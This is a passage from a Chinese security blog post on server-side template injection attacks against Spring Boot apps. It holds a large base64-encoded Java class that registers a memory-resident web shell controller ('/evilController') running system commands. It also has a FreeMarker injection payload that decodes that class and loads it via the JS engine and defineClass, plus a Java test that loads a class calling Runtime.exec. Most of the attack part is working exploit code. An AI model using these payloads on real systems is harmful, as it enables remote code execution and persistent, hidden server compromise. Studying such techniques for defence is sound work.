FcAWAcAWQwAWgBbAQATamF2YS9pby9JbnB1dFN0cmVhbQEADHJlYWRBbGxCeXRlcwEABCgpW0IKACIAXQwABQBeAQAfKFtCTGphdmEvbmlvL2NoYXJzZXQvQ2hhcnNldDspVgcAYAEAE2phdmEvaW8vSU9FeGNlcHRpb24HAGIBABpqYXZhL2xhbmcvUnVudGltZUV4Y2VwdGlvbgoAYQBkDAAFAGUBABgoTGphdmEvbGFuZy9UaHJvd2FibGU7KVYKAGcAaAcAaQwAagBrAQAnb3JnL3NwcmluZ2ZyYW1ld29yay9odHRwL1Jlc3BvbnNlRW50aXR5AQACb2sBAD0oTGphdmEvbGFuZy9PYmplY3Q7KUxvcmcvc3ByaW5nZnJhbWV3b3JrL2h0dHAvUmVzcG9uc2VFbnRpdHk7CABtAQAPL2V2aWxDb250cm9sbGVyCgBvAHAHAHEMAHIAcwEAO29yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvc3VwcG9ydC9SZXF1ZXN0Q29udGV4dFV0aWxzAQAZZmluZFdlYkFwcGxpY2F0aW9uQ29udGV4dAEAYihMamFrYXJ0YS9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OylMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9XZWJBcHBsaWNhdGlvbkNvbnRleHQ7CAB1AQAccmVxdWVzdE1hcHBpbmdIYW5kbGVyTWFwcGluZwcAdwEAUm9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9hbm5vdGF0aW9uL1JlcXVlc3RNYXBwaW5nSGFuZGxlck1hcHBpbmcLAHkAegcAewwAfAB9AQA1b3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9XZWJBcHBsaWNhdGlvbkNvbnRleHQBAAdnZXRCZWFuAQA3KExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvT2JqZWN0OwoAAgB/DACAAIEBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsKAIMAhAcAhQwAhgCBAQAPamF2YS9sYW5nL0NsYXNzAQANZ2V0U3VwZXJjbGFzcwgAiAEAD21hcHBpbmdSZWdpc3RyeQoAgwCKDACLAIwBABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7CgCOAI8HAJAMAJEAkgEAF2phdmEvbGFuZy9yZWZsZWN0L0ZpZWxkAQANc2V0QWNjZXNzaWJsZQEABChaKVYKAI4AlAwAlQCWAQADZ2V0AQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsHAJgBAFJvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvUmVxdWVzdE1hcHBpbmdJbmZvJEJ1aWxkZXJDb25maWd1cmF0aW9uCgCXAAMHAJsBADZvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi91dGlsL3BhdHRlcm4vUGF0aFBhdHRlcm5QYXJzZXIKAJoAAwoAlwCeDACfAKABABBzZXRQYXR0ZXJuUGFyc2VyAQA7KExvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi91dGlsL3BhdHRlcm4vUGF0aFBhdHRlcm5QYXJzZXI7KVYKAKIAowcApAwApQCmAQA9b3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbwEABXBhdGhzAQBcKFtMamF2YS9sYW5nL1N0cmluZzspTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm8kQnVpbGRlcjsHAKgBADVvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9iaW5kL2Fubm90YXRpb24vUmVxdWVzdE1ldGhvZAkApwCqDACrAKwBAANHRVQBADdMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvYmluZC9hbm5vdGF0aW9uL1JlcXVlc3RNZXRob2Q7CwCuAK8HALAMALEAsgEARW9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm8kQnVpbGRlcgEAB21ldGhvZHMBAIEoW0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9iaW5kL2Fubm90YXRpb24vUmVxdWVzdE1ldGhvZDspTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm8kQnVpbGRlcjsLAK4AtAwAtQC2AQAHb3B0aW9ucwEAnShMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbyRCdWlsZGVyQ29uZmlndXJhdGlvbjspTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm8kQnVpbGRlcjsLAK4AuAwAuQC6AQAFYnVpbGQBAEEoKUxvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvUmVxdWVzdE1hcHBpbmdJbmZvOwgAvAEACHJlZ2lzdGVyBwC+AQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kCgCDAMAMAMEAwgEAEWdldERlY2xhcmVkTWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwoAvQCPBwDFAQANbWVtQ29udHJvbGxlcggAxwEABHRlc3QKAMQAAwoAvQDKDADLAMwBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsHAM4BABNqYXZhL2xhbmcvRXhjZXB0aW9uCgDNANAMANEABgEAD3ByaW50U3RhY2tUcmFjZQEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAjTGNvbS9saW5neDUvbWVtU2hlbGwvbWVtQ29udHJvbGxlcjsBACsoKUxvcmcvc3ByaW5nZnJhbWV3b3JrL2h0dHAvUmVzcG9uc2VFbnRpdHk7AQAHcmVxdWVzdAEAKUxqYWthcnRhL3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAJaXNXaW5kb3dzAQABWgEAB2NoYXJzZXQBABpMamF2YS9uaW8vY2hhcnNldC9DaGFyc2V0OwEAEkxqYXZhL2xhbmcvU3RyaW5nOwEACGNtZEFycmF5AQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAB3Byb2Nlc3MBABNMamF2YS9sYW5nL1Byb2Nlc3M7AQAGc3Rkb3V0AQABZQEAFUxqYXZhL2lvL0lPRXhjZXB0aW9uOwEADVN0YWNrTWFwVGFibGUHAOABAAlTaWduYXR1cmUBAD8oKUxvcmcvc3ByaW5nZnJhbWV3b3JrL2h0dHAvUmVzcG9uc2VFbnRpdHk8TGphdmEvbGFuZy9TdHJpbmc7PjsBAAg8Y2xpbml0PgEABFBBVEgBAAphdHRyaWJ1dGVzAQBCTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvcmVxdWVzdC9TZXJ2bGV0UmVxdWVzdEF0dHJpYnV0ZXM7AQAIcmVxdWVzdDEBABV3ZWJBcHBsaWNhdGlvbkNvbnRleHQBADdMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9XZWJBcHBsaWNhdGlvbkNvbnRleHQ7AQAHbWFwcGluZwEAVExvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvYW5ub3RhdGlvbi9SZXF1ZXN0TWFwcGluZ0hhbmRsZXJNYXBwaW5nOwEAAWYBABlMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQASTGphdmEvbGFuZy9PYmplY3Q7AQAGY29uZmlnAQBUTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm8kQnVpbGRlckNvbmZpZ3VyYXRpb247AQAScmVxdWVzdE1hcHBpbmdJbmZvAQA/TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm87AQAaTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAAZtZXRob2QBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAApTb3VyY2VGaWxlAQASbWVtQ29udHJvbGxlci5qYXZhAQAMSW5uZXJDbGFzc2VzAQAUQnVpbGRlckNvbmZpZ3VyYXRpb24BAAdCdWlsZGVyACEAxAACAAAAAAADAAEABQAGAAEA0gAAAC8AAQABAAAABSq3AAGxAAAAAgDTAAAABgABAAAAFADUAAAADAABAAAABQDVANYAAAAJAMcA1wACANIAAAF0AAQABwAAAJK4AAfAAA22AA9MEhO4ABWyABu2ACESJ7YAKT0cmQALEi24AC+nAAgSNbgAL04rEje5ADkCADoEBr0AIlkDEj5TWQQSQFNZBRkEUzoFHJkAGAa9ACJZAxJCU1kEEkRTWQUZBFM6BbgARhkFtgBMOga7ACJZGQa2AFC2AFYttwBcS6cADUy7AGFZK7cAY78quABmsAABAAAAgACDAF8AAwDTAAAANgANAAAAGAAKABkAGwAaAC0AGwA3ABwATAAdAFAAHgBlACAAbwAhAIAAJQCDACMAhAAkAI0AJgDUAAAAXAAJAAoAdgDYANkAAQAbAGUA2gDbAAIALQBTANwA3QADADcASQA4AN4ABABMADQA3wDgAAUAbwARAOEA4gAGAIAAAwDjAN4AAACEAAkA5ADlAAEAjQAFAOMA3gAAAOYAAAAqAAX+ACcABwA6AUQHADD+ADgHADAHACIHAOf/AB0AAAABBwBf/AAJBwAiAOgAAAACAOkACADqAAYAAQDSAAAB2AAHAAsAAADdEmxLuAAHwAANTCu2AA9NLLgAbk4tEnQSdrkAeAMAwAB2OgQZBLYAfrYAgrYAghKHtgCJOgUZBQS2AI0ZBRkEtgCTOga7AJdZtwCZOgcZB7sAmlm3AJy2AJ0EvQAiWQMSbFO4AKEEvQCnWQOyAKlTuQCtAgAZB7kAswIAuQC3AQA6CBkGtgB+ErsGvQCDWQMSAlNZBBICU1kFEr1TtgC/OgkZCQS2AMMSxBLGA70Ag7YAvzoKGQkZBga9AAJZAxkIU1kEuwDEWbcAyFNZBRkKU7YAyVenAAhLKrYAz7EAAQAAANQA1wDNAAMA0wAAAFIAFAAAACoAAwAtAAoALgAPAC8AFAAwACMAMQA1ADIAOwAzAEQANABNADUAWQA2AGIANwCCADkAoQA6AKcAOwC0ADwA1ABAANcAPgDYAD8A3ABCANQAAAB6AAwAAwDRAOsA3gAAAAoAygDsAO0AAQAPAMUA7gDZAAIAFADAAO8A8AADACMAsQDxAPIABAA1AJ8A8wD0AAUARACQAIgA9QAGAE0AhwD2APcABwCCAFIA+AD5AAgAoQAzALwA+gAJALQAIAD7APoACgDYAAQA5AD8AAAA5gAAAAkAAvcA1wcAzQQAAgD9AAAAAgD+AP8AAAASAAIAlwCiAQAACQCuAKIBAQYJ&quot;</span>&gt;<br>$&#123;<span class="hljs-string">&quot;freemarker.template.utility.ObjectConstructor&quot;</span>?<span class="hljs-keyword">new</span>()(<span class="hljs-string">&quot;javax.script.ScriptEngineManager&quot;</span>).getEngineByName(<span class="hljs-string">&quot;js&quot;</span>).eval(<span class="hljs-string">&quot;classLoader=java.lang.Thread.currentThread().getContextClassLoader();b64cl=classLoader.loadClass(\&quot;java.util.Base64\&quot;);decoder=b64cl.getDeclaredMethod(\&quot;getDecoder\&quot;).invoke(null);b64 = &quot;</span>+b64+<span class="hljs-string">&quot;;bytes = decoder.decode(b64);ClassLoader1=classLoader.loadClass(\&quot;java.lang.ClassLoader\&quot;);byteType = \&quot;\&quot;.getBytes().getClass();IntType=java.lang.Integer.TYPE;defineClass = ClassLoader1.getDeclaredMethod(\&quot;defineClass\&quot;, byteType, IntType, IntType);defineClass.setAccessible(true);clazz=defineClass.invoke(classLoader, bytes, 0, bytes.length);clazz.newInstance();&quot;</span>)&#125;<br></code></pre></td></tr></table></figure>
+
+<p>js 引擎在 jdk.nashorn.internal.runtime.ScriptRuntime#apply 方法中 会桥接到Java 方法，所以这个引擎可以直接执行java代码</p>
+<p>在jdk8中测试如下代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.evil;<br><br><span class="hljs-keyword">import</span> javax.script.ScriptEngine;<br><span class="hljs-keyword">import</span> javax.script.ScriptEngineManager;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">jsTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ScriptEngine</span> <span class="hljs-variable">engine</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ScriptEngineManager</span>().getEngineByName(<span class="hljs-string">&quot;js&quot;</span>);<br>        <br>        <span class="hljs-type">String</span> <span class="hljs-variable">js</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;classLoader=java.lang.Thread.currentThread().getContextClassLoader();\n&quot;</span> +<br>                <span class="hljs-string">&quot;        b64cl = classLoader.loadClass(\&quot;java.util.Base64\&quot;);\n&quot;</span> +<br>                <span class="hljs-string">&quot;        decoder = b64cl.getDeclaredMethod(\&quot;getDecoder\&quot;).invoke(null);\n&quot;</span> +<br>                <span class="hljs-string">&quot;        b64 = \&quot;yv66vgAAADQAHgoABwARCgASABMIABQKABIAFQcAFgcAFwcAGAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAAg8Y2xpbml0PgEADVN0YWNrTWFwVGFibGUHABYBAApTb3VyY2VGaWxlAQAJdGVzdC5qYXZhDAAIAAkHABkMABoAGwEABGNhbGMMABwAHQEAE2phdmEvaW8vSU9FeGNlcHRpb24BABVjb20vbGluZ3g1L0VudHJ5L3Rlc3QBABBqYXZhL2xhbmcvT2JqZWN0AQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAYABwAAAAAAAgABAAgACQABAAoAAAAdAAEAAQAAAAUqtwABsQAAAAEACwAAAAYAAQAAAAUACAAMAAkAAQAKAAAARwACAAEAAAAOuAACEgO2AARXpwAES7EAAQAAAAkADAAFAAIACwAAABIABAAAAAgACQAKAAwACQANAAsADQAAAAcAAkwHAA4AAAEADwAAAAIAEA==\&quot;;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        bytes = decoder.decode(b64);\n&quot;</span> +<br>                <span class="hljs-string">&quot;        ClassLoader1 = classLoader.loadClass(\&quot;java.lang.ClassLoader\&quot;);\n&quot;</span> +<br>                <span class="hljs-string">&quot;        byteType = \&quot;\&quot;.getBytes().getClass();\n&quot;</span> +<br>                <span class="hljs-string">&quot;         clsInt = java.lang.Integer.TYPE;\n&quot;</span> +<br>                <span class="hljs-string">&quot;         defineClass = ClassLoader1.getDeclaredMethod(\&quot;defineClass\&quot;, byteType, clsInt, clsInt);\n&quot;</span> +<br>                <span class="hljs-string">&quot;        defineClass.setAccessible(true);\n&quot;</span> +<br>                <span class="hljs-string">&quot;        clazz = defineClass.invoke(classLoader, bytes, 0, bytes.length);\n&quot;</span> +<br>                <span class="hljs-string">&quot;        clazz.newInstance();&quot;</span>;<br>        engine.eval(js);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>可以正常执行</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250826095733171.png" srcset="/img/loading.gif" lazyload alt="image-20250826095733171"></p>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a target="_blank" rel="noopener" href="https://springdoc.cn/springboot-freemarker/">Spring Boot 整合 Freemarker 模板引擎 - spring 中文网</a></p>
+<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2463939">JAVA 安全之 FreeMark 沙箱绕过研究-腾讯云开发者社区-腾讯云</a></p>
+<p><a target="_blank" rel="noopener" href="https://developer.volcengine.com/articles/7381554591222988809">收集内存马打入方式 - 文章 - 开发者社区 - 火山引擎</a> </p>
+<p><a target="_blank" rel="noopener" href="https://landgrey.me/blog/22/">springboot 写文件到 RCE</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/su18/MemoryShell/blob/main/memshell-spring/src/main/java/org/su18/memshell/spring/controller/AddController.java">su18 AddController</a></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzkxMzMyNzMyMA==&mid=2247574270&idx=2&sn=9b68c9505420f0feae517ffbfb94f76c&chksm=c07e121ac23b55dc12a6c2d146cf1912959808dc4dab37fa9982c565b1fe03ce5ad2058069fa&mpshare=1&scene=1&srcid=0824wloDlaRkCHVST5ktZcch&sharer_shareinfo=d0af62cd6cddc8b981165543b8e6cffa&sharer_shareinfo_first=d0af62cd6cddc8b981165543b8e6cffa#rd">一文深度学习java内存马</a></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzkxNjY5MDc4Ng==&mid=2247484695&idx=1&sn=d143eca68da60a0f23f8dd92fde3710d&chksm=c0e58d2b5add6bff8668b6890551cc4add8ce04a5a2a278222b9156dabbe69a9b6cea27b4383&mpshare=1&scene=1&srcid=0825TuytrwMqKDrWXEsXABar&sharer_shareinfo=3f74ce255778a3ed4e105bfee6ac19a1&sharer_shareinfo_first=3f74ce255778a3ed4e105bfee6ac19a1#rd">Nashorn：潜伏在Java中的JavaScript命令执行后门</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/java%E5%AE%89%E5%85%A8/" class="category-chain-item">java安全</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/java%E5%AE%89%E5%85%A8/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" class="category-chain-item">SSTI模板注入</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/java%E5%AE%89%E5%85%A8/" class="print-no-link">#java安全</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>SpringBoot下的SSTI攻击方式</div>
+      <div>http://lingx5.github.io/2025/08/26/SpringBoot下的SSTI攻击方式/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>lingx5</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年8月26日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/08/26/java-SSTI-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" title="java-SSTI 模板注入">
+                        <span class="hidden-mobile">java-SSTI 模板注入</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a>
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
